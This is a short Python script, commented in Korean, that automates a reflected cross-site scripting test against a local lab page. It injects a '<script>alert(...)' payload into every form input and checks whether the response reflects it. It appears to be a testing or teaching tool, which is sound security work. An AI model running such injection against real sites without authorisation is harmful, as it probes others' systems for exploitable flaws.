from dataclasses import dataclass, field, asdict
from typing import List
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import requests

s = requests.Session()


@dataclass
class InputField:
    type: str = ""
    name: str = ""
    value: str = ""


@dataclass
class FormField:
    action: str = ""
    method: str = ""
    input_fields: List[InputField] = field(default_factory=list)


@dataclass
class JudgmentString:
    strings: list[str] = field(default_factory=list)


@dataclass
class InjectionString:
    strings: list[str] = field(default_factory=list)


# 판단에 사용할 문자열들을 가져온다
def get_judgment_strings():
    judgment_strings = JudgmentString()
    judgment_strings.strings += \
        {"<script>alert('reflected xss run')"}
    return judgment_strings


# 공격에 사용할 문자열들을 가져온다.
def get_injection_strings():
    injection_strings = InjectionString()
    injection_strings.strings += \
        {"<script>alert('reflected xss run')"}
    return injection_strings


# 페이지 중 <form>~</form> 태그 사이의 값을 가져온다.
# 현재 소스에서는 form 이 1개만 있다고 가정한다.
def get_form_area(url):
    soup = BeautifulSoup(s.get(url).content, "html.parser")
    form_area = soup.find("form")
    return form_area


# 폼 내부에서 input 필드를 모두 가져온다.
def get_form_info(form_area):
    form_field = FormField()
    form_field.action = form_area.attrs.get("action").lower()
    form_field.method = form_area.attrs.get("method", "get").lower()

    for input_tag in form_area.find_all("input"):
        input_field = InputField()
        input_field.type = input_tag.attrs.get("type", "text")
        input_field.name = input_tag.attrs.get("name")
        input_field.value = input_tag.attrs.get("value", "")

        form_field.input_fields.append(input_field)
    return form_field


# 공격 인자를 넣어 호출한 페이지의 응답 값 안에 판단에 필요한 문자열이 있는지 체크한다.
def check_vulnerability(response, url, payload):
    judgment_strings = get_judgment_strings()

    for judgment_string in judgment_strings.strings:
        if judgment_string in response.content.decode().lower():
            print("인젝션 발견: ", url, "\n테스트 데이터: ", str(payload),
                  "\n검출 문구: ", judgment_string, "\n", "-"*10)


# 공격용 인자를 만든다.
def make_payload(form_info, injection_string):
    payload = {}

    for input_field in form_info.input_fields:
        if input_field.type != "submit":
            payload.update({input_field.name: injection_string})

    return payload


# 페이지에 공격용 인자를 실어 전송 후 결과를 받는다.
def send_injection(url, form_info, payload):
    if form_info.method == "post":
        response = s.post(url, data=payload)
    elif form_info.method == "get":
        response = s.get(url, params=payload)
    return response


def page_scan(start_url):
    form_area = get_form_area(start_url)
    form_info = get_form_info(form_area)
    injection_strings = get_injection_strings()

    for injection_string in injection_strings.strings:
        payload = make_payload(form_info, injection_string)
        url = urljoin(start_url, form_info.action)
        response = send_injection(url, form_info, payload)
        check_vulnerability(response, url, payload)


if __name__ == "__main__":
    page_url = "http://127.0.0.1:5000/xss"
    page_scan(page_url)
